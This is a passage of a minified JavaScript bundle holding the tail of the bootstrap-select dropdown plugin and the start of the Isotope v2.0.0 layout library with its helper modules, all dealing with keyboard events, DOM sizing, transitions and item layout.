                this.$button.trigger("click.bs.dropdown.data-api")
            },
            keydown: function(e) {
                var t, i, s, n, o, r = P(this), l = r.hasClass("dropdown-toggle"), a = (l ? r.closest(".dropdown") : r.closest(F.MENU)).data("this"), c = a.findLis(), d = !1, h = e.which === H && !l && !a.options.selectOnTab, p = G.test(e.which) || h, u = a.$menuInner[0].scrollTop, f = !0 === a.isVirtual() ? a.selectpicker.view.position0 : 0;
                if (!(112 <= e.which && e.which <= 123))
                    if (!(i = a.$newElement.hasClass(V.SHOW)) && (p || 48 <= e.which && e.which <= 57 || 96 <= e.which && e.which <= 105 || 65 <= e.which && e.which <= 90) && (a.$button.trigger("click.bs.dropdown.data-api"),
                    a.options.liveSearch))
                        a.$searchbox.trigger("focus");
                    else {
                        if (e.which === A && i && (e.preventDefault(),
                        a.$button.trigger("click.bs.dropdown.data-api").trigger("focus")),
                        p) {
                            if (!c.length)
                                return;
                            -1 !== (t = (s = a.selectpicker.main.elements[a.activeIndex]) ? Array.prototype.indexOf.call(s.parentElement.children, s) : -1) && a.defocusItem(s),
                            e.which === B ? (-1 !== t && t--,
                            t + f < 0 && (t += c.length),
                            a.selectpicker.view.canHighlight[t + f] || -1 === (t = a.selectpicker.view.canHighlight.slice(0, t + f).lastIndexOf(!0) - f) && (t = c.length - 1)) : e.which !== R && !h || (++t + f >= a.selectpicker.view.canHighlight.length && (t = a.selectpicker.view.firstHighlightIndex),
                            a.selectpicker.view.canHighlight[t + f] || (t = t + 1 + a.selectpicker.view.canHighlight.slice(t + f + 1).indexOf(!0))),
                            e.preventDefault();
                            var m = f + t;
                            e.which === B ? 0 === f && t === c.length - 1 ? (a.$menuInner[0].scrollTop = a.$menuInner[0].scrollHeight,
                            m = a.selectpicker.current.elements.length - 1) : d = (o = (n = a.selectpicker.current.data[m]).position - n.height) < u : e.which !== R && !h || (t === a.selectpicker.view.firstHighlightIndex ? (a.$menuInner[0].scrollTop = 0,
                            m = a.selectpicker.view.firstHighlightIndex) : d = u < (o = (n = a.selectpicker.current.data[m]).position - a.sizeInfo.menuInnerHeight)),
                            s = a.selectpicker.current.elements[m],
                            a.activeIndex = a.selectpicker.current.data[m].index,
                            a.focusItem(s),
                            a.selectpicker.view.currentActive = s,
                            d && (a.$menuInner[0].scrollTop = o),
                            a.options.liveSearch ? a.$searchbox.trigger("focus") : r.trigger("focus")
                        } else if (!r.is("input") && !q.test(e.which) || e.which === D && a.selectpicker.keydown.keyHistory) {
                            var v, g, b = [];
                            e.preventDefault(),
                            a.selectpicker.keydown.keyHistory += C[e.which],
                            a.selectpicker.keydown.resetKeyHistory.cancel && clearTimeout(a.selectpicker.keydown.resetKeyHistory.cancel),
                            a.selectpicker.keydown.resetKeyHistory.cancel = a.selectpicker.keydown.resetKeyHistory.start(),
                            g = a.selectpicker.keydown.keyHistory,
                            /^(.)\1+$/.test(g) && (g = g.charAt(0));
                            for (var w = 0; w < a.selectpicker.current.data.length; w++) {
                                var I = a.selectpicker.current.data[w];
                                k(I, g, "startsWith", !0) && a.selectpicker.view.canHighlight[w] && b.push(I.index)
                            }
                            if (b.length) {
                                var x = 0;
                                c.removeClass("active").find("a").removeClass("active"),
                                1 === g.length && (-1 === (x = b.indexOf(a.activeIndex)) || x === b.length - 1 ? x = 0 : x++),
                                v = b[x],
                                d = 0 < u - (n = a.selectpicker.main.data[v]).position ? (o = n.position - n.height,
                                !0) : (o = n.position - a.sizeInfo.menuInnerHeight,
                                n.position > u + a.sizeInfo.menuInnerHeight),
                                s = a.selectpicker.main.elements[v],
                                a.activeIndex = b[x],
                                a.focusItem(s),
                                s && s.firstChild.focus(),
                                d && (a.$menuInner[0].scrollTop = o),
                                r.trigger("focus")
                            }
                        }
                        i && (e.which === D && !a.selectpicker.keydown.keyHistory || e.which === L || e.which === H && a.options.selectOnTab) && (e.which !== D && e.preventDefault(),
                        a.options.liveSearch && e.which === D || (a.$menuInner.find(".active a").trigger("click", !0),
                        r.trigger("focus"),
                        a.options.liveSearch || (e.preventDefault(),
                        P(document).data("spaceSelect", !0))))
                    }
            },
            mobile: function() {
                this.options.mobile = !0,
                this.$element[0].classList.add("mobile-device")
            },
            refresh: function() {
                var e = P.extend({}, this.options, this.$element.data());
                this.options = e,
                this.checkDisabled(),
                this.buildData(),
                this.setStyle(),
                this.render(),
                this.buildList(),
                this.setWidth(),
                this.setSize(!0),
                this.$element.trigger("refreshed" + j)
            },
            hide: function() {
                this.$newElement.hide()
            },
            show: function() {
                this.$newElement.show()
            },
            remove: function() {
                this.$newElement.remove(),
                this.$element.remove()
            },
            destroy: function() {
                this.$newElement.before(this.$element).remove(),
                this.$bsContainer ? this.$bsContainer.remove() : this.$menu.remove(),
                this.selectpicker.view.titleOption && this.selectpicker.view.titleOption.parentNode && this.selectpicker.view.titleOption.parentNode.removeChild(this.selectpicker.view.titleOption),
                this.$element.off(j).removeData("selectpicker").removeClass("bs-select-hidden selectpicker"),
                P(window).off(j + "." + this.selectId)
            }
        };
        var J = P.fn.selectpicker;
        function Q() {
            if (P.fn.dropdown)
                return (P.fn.dropdown.Constructor._dataApiKeydownHandler || P.fn.dropdown.Constructor.prototype.keydown).apply(this, arguments)
        }
        P.fn.selectpicker = Z,
        P.fn.selectpicker.Constructor = Y,
        P.fn.selectpicker.noConflict = function() {
            return P.fn.selectpicker = J,
            this
        }
        ,
        P(document).off("keydown.bs.dropdown.data-api").on("keydown.bs.dropdown.data-api", ':not(.bootstrap-select) > [data-toggle="dropdown"]', Q).on("keydown.bs.dropdown.data-api", ":not(.bootstrap-select) > .dropdown-menu", Q).on("keydown" + j, '.bootstrap-select [data-toggle="dropdown"], .bootstrap-select [role="listbox"], .bootstrap-select .bs-searchbox input', Y.prototype.keydown).on("focusin.modal", '.bootstrap-select [data-toggle="dropdown"], .bootstrap-select [role="listbox"], .bootstrap-select .bs-searchbox input', function(e) {
            e.stopPropagation()
        }),
        P(window).on("load" + j + ".data-api", function() {
            P(".selectpicker").each(function() {
                var e = P(this);
                Z.call(e, e.data())
            })
        })
    }(e)
});
/*!
* Isotope PACKAGED v2.0.0
* Filter & sort magical layouts
* http://isotope.metafizzy.co
*/
(function(t) {
    function e() {}
    function i(t) {
        function i(e) {
            e.prototype.option || (e.prototype.option = function(e) {
                t.isPlainObject(e) && (this.options = t.extend(!0, this.options, e))
            }
            )
        }
        function n(e, i) {
            t.fn[e] = function(n) {
                if ("string" == typeof n) {
                    for (var s = o.call(arguments, 1), a = 0, u = this.length; u > a; a++) {
                        var p = this[a]
                          , h = t.data(p, e);
                        if (h)
                            if (t.isFunction(h[n]) && "_" !== n.charAt(0)) {
                                var f = h[n].apply(h, s);
                                if (void 0 !== f)
                                    return f
                            } else
                                r("no such method '" + n + "' for " + e + " instance");
                        else
                            r("cannot call methods on " + e + " prior to initialization; " + "attempted to call '" + n + "'")
                    }
                    return this
                }
                return this.each(function() {
                    var o = t.data(this, e);
                    o ? (o.option(n),
                    o._init()) : (o = new i(this,n),
                    t.data(this, e, o))
                })
            }
        }
        if (t) {
            var r = "undefined" == typeof console ? e : function(t) {
                console.error(t)
            }
            ;
            return t.bridget = function(t, e) {
                i(e),
                n(t, e)
            }
            ,
            t.bridget
        }
    }
    var o = Array.prototype.slice;
    "function" == typeof define && define.amd ? define("jquery-bridget/jquery.bridget", ["jquery"], i) : i(t.jQuery)
}
)(window),
function(t) {
    function e(e) {
        var i = t.event;
        return i.target = i.target || i.srcElement || e,
        i
    }
    var i = document.documentElement
      , o = function() {};
    i.addEventListener ? o = function(t, e, i) {
        t.addEventListener(e, i, !1)
    }
    : i.attachEvent && (o = function(t, i, o) {
        t[i + o] = o.handleEvent ? function() {
            var i = e(t);
            o.handleEvent.call(o, i)
        }
        : function() {
            var i = e(t);
            o.call(t, i)
        }
        ,
        t.attachEvent("on" + i, t[i + o])
    }
    );
    var n = function() {};
    i.removeEventListener ? n = function(t, e, i) {
        t.removeEventListener(e, i, !1)
    }
    : i.detachEvent && (n = function(t, e, i) {
        t.detachEvent("on" + e, t[e + i]);
        try {
            delete t[e + i]
        } catch (o) {
            t[e + i] = void 0
        }
    }
    );
    var r = {
        bind: o,
        unbind: n
    };
    "function" == typeof define && define.amd ? define("eventie/eventie", r) : "object" == typeof exports ? module.exports = r : t.eventie = r
}(this),
function(t) {
    function e(t) {
        "function" == typeof t && (e.isReady ? t() : r.push(t))
    }
    function i(t) {
        var i = "readystatechange" === t.type && "complete" !== n.readyState;
        if (!e.isReady && !i) {
            e.isReady = !0;
            for (var o = 0, s = r.length; s > o; o++) {
                var a = r[o];
                a()
            }
        }
    }
    function o(o) {
        return o.bind(n, "DOMContentLoaded", i),
        o.bind(n, "readystatechange", i),
        o.bind(t, "load", i),
        e
    }
    var n = t.document
      , r = [];
    e.isReady = !1,
    "function" == typeof define && define.amd ? (e.isReady = "function" == typeof requirejs,
    define("doc-ready/doc-ready", ["eventie/eventie"], o)) : t.docReady = o(t.eventie)
}(this),
function() {
    function t() {}
    function e(t, e) {
        for (var i = t.length; i--; )
            if (t[i].listener === e)
                return i;
        return -1
    }
    function i(t) {
        return function() {
            return this[t].apply(this, arguments)
        }
    }
    var o = t.prototype
      , n = this
      , r = n.EventEmitter;
    o.getListeners = function(t) {
        var e, i, o = this._getEvents();
        if (t instanceof RegExp) {
            e = {};
            for (i in o)
                o.hasOwnProperty(i) && t.test(i) && (e[i] = o[i])
        } else
            e = o[t] || (o[t] = []);
        return e
    }
    ,
    o.flattenListeners = function(t) {
        var e, i = [];
        for (e = 0; t.length > e; e += 1)
            i.push(t[e].listener);
        return i
    }
    ,
    o.getListenersAsObject = function(t) {
        var e, i = this.getListeners(t);
        return i instanceof Array && (e = {},
        e[t] = i),
        e || i
    }
    ,
    o.addListener = function(t, i) {
        var o, n = this.getListenersAsObject(t), r = "object" == typeof i;
        for (o in n)
            n.hasOwnProperty(o) && -1 === e(n[o], i) && n[o].push(r ? i : {
                listener: i,
                once: !1
            });
        return this
    }
    ,
    o.on = i("addListener"),
    o.addOnceListener = function(t, e) {
        return this.addListener(t, {
            listener: e,
            once: !0
        })
    }
    ,
    o.once = i("addOnceListener"),
    o.defineEvent = function(t) {
        return this.getListeners(t),
        this
    }
    ,
    o.defineEvents = function(t) {
        for (var e = 0; t.length > e; e += 1)
            this.defineEvent(t[e]);
        return this
    }
    ,
    o.removeListener = function(t, i) {
        var o, n, r = this.getListenersAsObject(t);
        for (n in r)
            r.hasOwnProperty(n) && (o = e(r[n], i),
            -1 !== o && r[n].splice(o, 1));
        return this
    }
    ,
    o.off = i("removeListener"),
    o.addListeners = function(t, e) {
        return this.manipulateListeners(!1, t, e)
    }
    ,
    o.removeListeners = function(t, e) {
        return this.manipulateListeners(!0, t, e)
    }
    ,
    o.manipulateListeners = function(t, e, i) {
        var o, n, r = t ? this.removeListener : this.addListener, s = t ? this.removeListeners : this.addListeners;
        if ("object" != typeof e || e instanceof RegExp)
            for (o = i.length; o--; )
                r.call(this, e, i[o]);
        else
            for (o in e)
                e.hasOwnProperty(o) && (n = e[o]) && ("function" == typeof n ? r.call(this, o, n) : s.call(this, o, n));
        return this
    }
    ,
    o.removeEvent = function(t) {
        var e, i = typeof t, o = this._getEvents();
        if ("string" === i)
            delete o[t];
        else if (t instanceof RegExp)
            for (e in o)
                o.hasOwnProperty(e) && t.test(e) && delete o[e];
        else
            delete this._events;
        return this
    }
    ,
    o.removeAllListeners = i("removeEvent"),
    o.emitEvent = function(t, e) {
        var i, o, n, r, s = this.getListenersAsObject(t);
        for (n in s)
            if (s.hasOwnProperty(n))
                for (o = s[n].length; o--; )
                    i = s[n][o],
                    i.once === !0 && this.removeListener(t, i.listener),
                    r = i.listener.apply(this, e || []),
                    r === this._getOnceReturnValue() && this.removeListener(t, i.listener);
        return this
    }
    ,
    o.trigger = i("emitEvent"),
    o.emit = function(t) {
        var e = Array.prototype.slice.call(arguments, 1);
        return this.emitEvent(t, e)
    }
    ,
    o.setOnceReturnValue = function(t) {
        return this._onceReturnValue = t,
        this
    }
    ,
    o._getOnceReturnValue = function() {
        return this.hasOwnProperty("_onceReturnValue") ? this._onceReturnValue : !0
    }
    ,
    o._getEvents = function() {
        return this._events || (this._events = {})
    }
    ,
    t.noConflict = function() {
        return n.EventEmitter = r,
        t
    }
    ,
    "function" == typeof define && define.amd ? define("eventEmitter/EventEmitter", [], function() {
        return t
    }) : "object" == typeof module && module.exports ? module.exports = t : this.EventEmitter = t
}
.call(this),
function(t) {
    function e(t) {
        if (t) {
            if ("string" == typeof o[t])
                return t;
            t = t.charAt(0).toUpperCase() + t.slice(1);
            for (var e, n = 0, r = i.length; r > n; n++)
                if (e = i[n] + t,
                "string" == typeof o[e])
                    return e
        }
    }
    var i = "Webkit Moz ms Ms O".split(" ")
      , o = document.documentElement.style;
    "function" == typeof define && define.amd ? define("get-style-property/get-style-property", [], function() {
        return e
    }) : "object" == typeof exports ? module.exports = e : t.getStyleProperty = e
}(window),
function(t) {
    function e(t) {
        var e = parseFloat(t)
          , i = -1 === t.indexOf("%") && !isNaN(e);
        return i && e
    }
    function i() {
        for (var t = {
            width: 0,
            height: 0,
            innerWidth: 0,
            innerHeight: 0,
            outerWidth: 0,
            outerHeight: 0
        }, e = 0, i = s.length; i > e; e++) {
            var o = s[e];
            t[o] = 0
        }
        return t
    }
    function o(t) {
        function o(t) {
            if ("string" == typeof t && (t = document.querySelector(t)),
            t && "object" == typeof t && t.nodeType) {
                var o = r(t);
                if ("none" === o.display)
                    return i();
                var n = {};
                n.width = t.offsetWidth,
                n.height = t.offsetHeight;
                for (var h = n.isBorderBox = !(!p || !o[p] || "border-box" !== o[p]), f = 0, c = s.length; c > f; f++) {
                    var d = s[f]
                      , l = o[d];
                    l = a(t, l);
                    var y = parseFloat(l);
                    n[d] = isNaN(y) ? 0 : y
                }
                var m = n.paddingLeft + n.paddingRight
                  , g = n.paddingTop + n.paddingBottom
                  , v = n.marginLeft + n.marginRight
                  , _ = n.marginTop + n.marginBottom
                  , I = n.borderLeftWidth + n.borderRightWidth
                  , L = n.borderTopWidth + n.borderBottomWidth
                  , z = h && u
                  , S = e(o.width);
                S !== !1 && (n.width = S + (z ? 0 : m + I));
                var b = e(o.height);
                return b !== !1 && (n.height = b + (z ? 0 : g + L)),
                n.innerWidth = n.width - (m + I),
                n.innerHeight = n.height - (g + L),
                n.outerWidth = n.width + v,
                n.outerHeight = n.height + _,
                n
            }
        }
        function a(t, e) {
            if (n || -1 === e.indexOf("%"))
                return e;
            var i = t.style
              , o = i.left
              , r = t.runtimeStyle
              , s = r && r.left;
            return s && (r.left = t.currentStyle.left),
            i.left = e,
            e = i.pixelLeft,
            i.left = o,
            s && (r.left = s),
            e
        }
        var u, p = t("boxSizing");
        return function() {
            if (p) {
                var t = document.createElement("div");
                t.style.width = "200px",
                t.style.padding = "1px 2px 3px 4px",
                t.style.borderStyle = "solid",
                t.style.borderWidth = "1px 2px 3px 4px",
                t.style[p] = "border-box";
                var i = document.body || document.documentElement;
                i.appendChild(t);
                var o = r(t);
                u = 200 === e(o.width),
                i.removeChild(t)
            }
        }(),
        o
    }
    var n = t.getComputedStyle
      , r = n ? function(t) {
        return n(t, null)
    }
    : function(t) {
        return t.currentStyle
    }
      , s = ["paddingLeft", "paddingRight", "paddingTop", "paddingBottom", "marginLeft", "marginRight", "marginTop", "marginBottom", "borderLeftWidth", "borderRightWidth", "borderTopWidth", "borderBottomWidth"];
    "function" == typeof define && define.amd ? define("get-size/get-size", ["get-style-property/get-style-property"], o) : "object" == typeof exports ? module.exports = o(require("get-style-property")) : t.getSize = o(t.getStyleProperty)
}(window),
function(t, e) {
    function i(t, e) {
        return t[a](e)
    }
    function o(t) {
        if (!t.parentNode) {
            var e = document.createDocumentFragment();
            e.appendChild(t)
        }
    }
    function n(t, e) {
        o(t);
        for (var i = t.parentNode.querySelectorAll(e), n = 0, r = i.length; r > n; n++)
            if (i[n] === t)
                return !0;
        return !1
    }
    function r(t, e) {
        return o(t),
        i(t, e)
    }
    var s, a = function() {
        if (e.matchesSelector)
            return "matchesSelector";
        for (var t = ["webkit", "moz", "ms", "o"], i = 0, o = t.length; o > i; i++) {
            var n = t[i]
              , r = n + "MatchesSelector";
            if (e[r])
                return r
        }
    }();
    if (a) {
        var u = document.createElement("div")
          , p = i(u, "div");
        s = p ? i : r
    } else
        s = n;
    "function" == typeof define && define.amd ? define("matches-selector/matches-selector", [], function() {
        return s
    }) : window.matchesSelector = s
}(this, Element.prototype),
function(t) {
    function e(t, e) {
        for (var i in e)
            t[i] = e[i];
        return t
    }
    function i(t) {
        for (var e in t)
            return !1;
        return e = null,
        !0
    }
    function o(t) {
        return t.replace(/([A-Z])/g, function(t) {
            return "-" + t.toLowerCase()
        })
    }
    function n(t, n, r) {
        function a(t, e) {
            t && (this.element = t,
            this.layout = e,
            this.position = {
                x: 0,
                y: 0
            },
            this._create())
        }
        var u = r("transition")
          , p = r("transform")
          , h = u && p
          , f = !!r("perspective")
          , c = {
            WebkitTransition: "webkitTransitionEnd",
            MozTransition: "transitionend",
            OTransition: "otransitionend",
            transition: "transitionend"
        }[u]
          , d = ["transform", "transition", "transitionDuration", "transitionProperty"]
          , l = function() {
            for (var t = {}, e = 0, i = d.length; i > e; e++) {
                var o = d[e]
                  , n = r(o);
                n && n !== o && (t[o] = n)
            }
            return t
        }();
        e(a.prototype, t.prototype),
        a.prototype._create = function() {
            this._transn = {
                ingProperties: {},
                clean: {},
                onEnd: {}
            },
            this.css({
                position: "absolute"
            })
        }
        ,
        a.prototype.handleEvent = function(t) {
            var e = "on" + t.type;
            this[e] && this[e](t)
        }
        ,
        a.prototype.getSize = function() {
            this.size = n(this.element)
        }
        ,
        a.prototype.css = function(t) {
            var e = this.element.style;
            for (var i in t) {
                var o = l[i] || i;
                e[o] = t[i]
            }
        }
        ,
        a.prototype.getPosition = function() {
            var t = s(this.element)
              , e = this.layout.options
              , i = e.isOriginLeft
              , o = e.isOriginTop
              , n = parseInt(t[i ? "left" : "right"], 10)
              , r = parseInt(t[o ? "top" : "bottom"], 10);
            n = isNaN(n) ? 0 : n,
            r = isNaN(r) ? 0 : r;
            var a = this.layout.size;
            n -= i ? a.paddingLeft : a.paddingRight,
            r -= o ? a.paddingTop : a.paddingBottom,
            this.position.x = n,
            this.position.y = r
        }
        ,
        a.prototype.layoutPosition = function() {
            var t = this.layout.size
              , e = this.layout.options
              , i = {};
            e.isOriginLeft ? (i.left = this.position.x + t.paddingLeft + "px",
            i.right = "") : (i.right = this.position.x + t.paddingRight + "px",
            i.left = ""),
            e.isOriginTop ? (i.top = this.position.y + t.paddingTop + "px",
            i.bottom = "") : (i.bottom = this.position.y + t.paddingBottom + "px",
            i.top = ""),
            this.css(i),
            this.emitEvent("layout", [this])
        }
        ;
        var y = f ? function(t, e) {
            return "translate3d(" + t + "px, " + e + "px, 0)"
        }
        : function(t, e) {
            return "translate(" + t + "px, " + e + "px)"
        }
        ;
        a.prototype._transitionTo = function(t, e) {
            this.getPosition();
            var i = this.position.x
              , o = this.position.y
              , n = parseInt(t, 10)
              , r = parseInt(e, 10)
              , s = n === this.position.x && r === this.position.y;
            if (this.setPosition(t, e),
            s && !this.isTransitioning)
                return this.layoutPosition(),
                void 0;
            var a = t - i
              , u = e - o
              , p = {}
              , h = this.layout.options;
            a = h.isOriginLeft ? a : -a,
            u = h.isOriginTop ? u : -u,
            p.transform = y(a, u),
            this.transition({
                to: p,
                onTransitionEnd: {
                    transform: this.layoutPosition
                },
                isCleaning: !0
            })
        }
        ,
        a.prototype.goTo = function(t, e) {
            this.setPosition(t, e),
            this.layoutPosition()
        }
        ,
        a.prototype.moveTo = h ? a.prototype._transitionTo : a.prototype.goTo,
        a.prototype.setPosition = function(t, e) {
            this.position.x = parseInt(t, 10),
            this.position.y = parseInt(e, 10)
        }
        ,
        a.prototype._nonTransition = function(t) {
            this.css(t.to),
            t.isCleaning && this._removeStyles(t.to);
            for (var e in t.onTransitionEnd)
                t.onTransitionEnd[e].call(this)
        }
        ,
        a.prototype._transition = function(t) {
            if (!parseFloat(this.layout.options.transitionDuration))
                return this._nonTransition(t),
                void 0;
            var e = this._transn;
            for (var i in t.onTransitionEnd)
                e.onEnd[i] = t.onTransitionEnd[i];
            for (i in t.to)
                e.ingProperties[i] = !0,
                t.isCleaning && (e.clean[i] = !0);
            if (t.from) {
                this.css(t.from);
                var o = this.element.offsetHeight;
                o = null
            }
            this.enableTransition(t.to),
            this.css(t.to),
            this.isTransitioning = !0
        }
        ;
        var m = p && o(p) + ",opacity";
        a.prototype.enableTransition = function() {
            this.isTransitioning || (this.css({
                transitionProperty: m,
                transitionDuration: this.layout.options.transitionDuration
            }),
            this.element.addEventListener(c, this, !1))
        }
        ,
        a.prototype.transition = a.prototype[u ? "_transition" : "_nonTransition"],
        a.prototype.onwebkitTransitionEnd = function(t) {
            this.ontransitionend(t)
        }
        ,
        a.prototype.onotransitionend = function(t) {
            this.ontransitionend(t)
        }
        ;
        var g = {
            "-webkit-transform": "transform",
            "-moz-transform": "transform",
            "-o-transform": "transform"
        };
        a.prototype.ontransitionend = function(t) {
            if (t.target === this.element) {
                var e = this._transn
                  , o = g[t.propertyName] || t.propertyName;
                if (delete e.ingProperties[o],
                i(e.ingProperties) && this.disableTransition(),
                o in e.clean && (this.element.style[t.propertyName] = "",
                delete e.clean[o]),
                o in e.onEnd) {
                    var n = e.onEnd[o];
                    n.call(this),
                    delete e.onEnd[o]
                }
                this.emitEvent("transitionEnd", [this])
            }
        }
        ,
        a.prototype.disableTransition = function() {
            this.removeTransitionStyles(),
            this.element.removeEventListener(c, this, !1),
            this.isTransitioning = !1
        }
        ,
        a.prototype._removeStyles = function(t) {
            var e = {};
            for (var i in t)
                e[i] = "";
            this.css(e)
        }
        ;
        var v = {
            transitionProperty: "",
            transitionDuration: ""
        };
        return a.prototype.removeTransitionStyles = function() {
            this.css(v)
        }
        ,
        a.prototype.removeElem = function() {
            this.element.parentNode.removeChild(this.element),
            this.emitEvent("remove", [this])
        }
        ,
        a.prototype.remove = function() {
            if (!u || !parseFloat(this.layout.options.transitionDuration))
                return this.removeElem(),
                void 0;
            var t = this;
            this.on("transitionEnd", function() {
                return t.removeElem(),
                !0
            }),
            this.hide()
        }
        ,
        a.prototype.reveal = function() {
            delete this.isHidden,
            this.css({
                display: ""
            });
            var t = this.layout.options;
            this.transition({
                from: t.hiddenStyle,
                to: t.visibleStyle,
                isCleaning: !0
            })
        }
        ,
        a.prototype.hide = function() {
            this.isHidden = !0,
            this.css({
                display: ""
            });
            var t = this.layout.options;
            this.transition({
                from: t.visibleStyle,
                to: t.hiddenStyle,
                isCleaning: !0,
                onTransitionEnd: {
                    opacity: function() {
                        this.isHidden && this.css({
                            display: "none"
                        })
                    }
                }
            })
        }
        ,
        a.prototype.destroy = function() {
            this.css({
                position: "",
                left: "",
                right: "",
                top: "",
                bottom: "",
                transition: "",
                transform: ""
            })
        }
        ,
        a
    }
    var r = t.getComputedStyle
      , s = r ? function(t) {
        return r(t, null)
    }
    : function(t) {
        return t.currentStyle
    }
    ;
    "function" == typeof define && define.amd ? define("outlayer/item", ["eventEmitter/EventEmitter", "get-size/get-size", "get-style-property/get-style-property"], n) : (t.Outlayer = {},
    t.Outlayer.Item = n(t.EventEmitter, t.getSize, t.getStyleProperty))
}(window),
function(t) {
    function e(t, e) {
        for (var i in e)
            t[i] = e[i];
        return t
    }
    function i(t) {
        return "[object Array]" === f.call(t)
    }
    function o(t) {
        var e = [];
        if (i(t))
            e = t;
        else if (t && "number" == typeof t.length)
            for (var o = 0, n = t.length; n > o; o++)
                e.push(t[o]);
        else
            e.push(t);
        return e
    }
    function n(t, e) {
        var i = d(e, t);
        -1 !== i && e.splice(i, 1)
    }
    function r(t) {
        return t.replace(/(.)([A-Z])/g, function(t, e, i) {
            return e + "-" + i
        }).toLowerCase()
    }
    function s(i, s, f, d, l, y) {
        function m(t, i) {
            if ("string" == typeof t && (t = a.querySelector(t)),
            !t || !c(t))
                return u && u.error("Bad " + this.constructor.namespace + " element: " + t),
                void 0;
            this.element = t,
            this.options = e({}, this.constructor.defaults),
            this.option(i);
            var o = ++g;
            this.element.outlayerGUID = o,
            v[o] = this,
            this._create(),
            this.options.isInitLayout && this.layout()
        }
        var g = 0
          , v = {};
        return m.namespace = "outlayer",
        m.Item = y,
        m.defaults = {
            containerStyle: {
                position: "relative"
            },
            isInitLayout: !0,
            isOriginLeft: !0,
            isOriginTop: !0,
            isResizeBound: !0,
            isResizingContainer: !0,
            transitionDuration: "0.4s",
            hiddenStyle: {
                opacity: 0,
                transform: "scale(0.001)"
            },
            visibleStyle: {
                opacity: 1,
                transform: "scale(1)"
            }
        },
        e(m.prototype, f.prototype),
        m.prototype.option = function(t) {
            e(this.options, t)
        }
        ,
        m.prototype._create = function() {
            this.reloadItems(),
            this.stamps = [],
            this.stamp(this.options.stamp),
            e(this.element.style, this.options.containerStyle),
            this.options.isResizeBound && this.bindResize()
        }
        ,
        m.prototype.reloadItems = function() {
            this.items = this._itemize(this.element.children)
        }
        ,
        m.prototype._itemize = function(t) {
            for (var e = this._filterFindItemElements(t), i = this.constructor.Item, o = [], n = 0, r = e.length; r > n; n++) {
                var s = e[n]
                  , a = new i(s,this);
                o.push(a)
            }
            return o
        }
        ,
        m.prototype._filterFindItemElements = function(t) {
            t = o(t);
            for (var e = this.options.itemSelector, i = [], n = 0, r = t.length; r > n; n++) {
                var s = t[n];
                if (c(s))
                    if (e) {
                        l(s, e) && i.push(s);
                        for (var a = s.querySelectorAll(e), u = 0, p = a.length; p > u; u++)
                            i.push(a[u])
                    } else
                        i.push(s)
            }
            return i
        }
        ,
        m.prototype.getItemElements = function() {
            for (var t = [], e = 0, i = this.items.length; i > e; e++)
                t.push(this.items[e].element);
            return t
        }
        ,
        m.prototype.layout = function() {
            this._resetLayout(),
            this._manageStamps();
            var t = void 0 !== this.options.isLayoutInstant ? this.options.isLayoutInstant : !this._isLayoutInited;
            this.layoutItems(this.items, t),
            this._isLayoutInited = !0
        }
        ,
        m.prototype._init = m.prototype.layout,
        m.prototype._resetLayout = function() {
            this.getSize()
        }
        ,
        m.prototype.getSize = function() {
            this.size = d(this.element)
        }
        ,
        m.prototype._getMeasurement = function(t, e) {
            var i, o = this.options[t];
            o ? ("string" == typeof o ? i = this.element.querySelector(o) : c(o) && (i = o),
            this[t] = i ? d(i)[e] : o) : this[t] = 0
        }
        ,
        m.prototype.layoutItems = function(t, e) {
            t = this._getItemsForLayout(t),
            this._layoutItems(t, e),
            this._postLayout()
        }
        ,
        m.prototype._getItemsForLayout = function(t) {
            for (var e = [], i = 0, o = t.length; o > i; i++) {
                var n = t[i];
                n.isIgnored || e.push(n)
            }
            return e
        }
        ,
        m.prototype._layoutItems = function(t, e) {
            function i() {
                o.emitEvent("layoutComplete", [o, t])
            }
            var o = this;
            if (!t || !t.length)
                return i(),
                void 0;
            this._itemsOn(t, "layout", i);
            for (var n = [], r = 0, s = t.length; s > r; r++) {
                var a = t[r]
                  , u = this._getItemLayoutPosition(a);
                u.item = a,
                u.isInstant = e || a.isLayoutInstant,
                n.push(u)
            }
            this._processLayoutQueue(n)
        }
        ,
        m.prototype._getItemLayoutPosition = function() {
            return {
                x: 0,
                y: 0
            }
        }
        ,
        m.prototype._processLayoutQueue = function(t) {
            for (var e = 0, i = t.length; i > e; e++) {
                var o = t[e];
                this._positionItem(o.item, o.x, o.y, o.isInstant)
            }
        }
        ,
        m.prototype._positionItem = function(t, e, i, o) {
            o ? t.goTo(e, i) : t.moveTo(e, i)
        }
        ,
        m.prototype._postLayout = function() {
            this.resizeContainer()
        }
        ,
        m.prototype.resizeContainer = function() {
            if (this.options.isResizingContainer) {
                var t = this._getContainerSize();
                t && (this._setContainerMeasure(t.width, !0),
                this._setContainerMeasure(t.height, !1))
            }
        }
        ,
        m.prototype._getContainerSize = h,
        m.prototype._setContainerMeasure = function(t, e) {
            if (void 0 !== t) {
                var i = this.size;
                i.isBorderBox && (t += e ? i.paddingLeft + i.paddingRight + i.borderLeftWidth + i.borderRightWidth : i.paddingBottom + i.paddingTop + i.borderTopWidth + i.borderBottomWidth),
                t = Math.max(t, 0),
                this.element.style[e ? "width" : "height"] = t + "px"
            }
        }
        ,
        m.prototype._itemsOn = function(t, e, i) {
            function o() {
                return n++,
                n === r && i.call(s),
                !0
            }
            for (var n = 0, r = t.length, s = this, a = 0, u = t.length; u > a; a++) {
                var p = t[a];
                p.on(e, o)
            }
        }
        ,
        m.prototype.ignore = function(t) {
            var e = this.getItem(t);
            e && (e.isIgnored = !0)
        }
        ,
        m.prototype.unignore = function(t) {
            var e = this.getItem(t);
            e && delete e.isIgnored
        }
        ,
        m.prototype.stamp = function(t) {
            if (t = this._find(t)) {
                this.stamps = this.stamps.concat(t);
                for (var e = 0, i = t.length; i > e; e++) {
                    var o = t[e];
                    this.ignore(o)
                }
            }
        }
        ,
        m.prototype.unstamp = function(t) {
            if (t = this._find(t))
                for (var e = 0, i = t.length; i > e; e++) {
                    var o = t[e];
                    n(o, this.stamps),
                    this.unignore(o)
                }
        }
        ,
        m.prototype._find = function(t) {
            return t ? ("string" == typeof t && (t = this.element.querySelectorAll(t)),
            t = o(t)) : void 0
        }
        ,
        m.prototype._manageStamps = function() {
            if (this.stamps && this.stamps.length) {
                this._getBoundingRect();
                for (var t = 0, e = this.stamps.length; e > t; t++) {
                    var i = this.stamps[t];
                    this._manageStamp(i)
                }
            }
        }
        ,
        m.prototype._getBoundingRect = function() {
            var t = this.element.getBoundingClientRect()
              , e = this.size;
            this._boundingRect = {
                left: t.left + e.paddingLeft + e.borderLeftWidth,
                top: t.top + e.paddingTop + e.borderTopWidth,
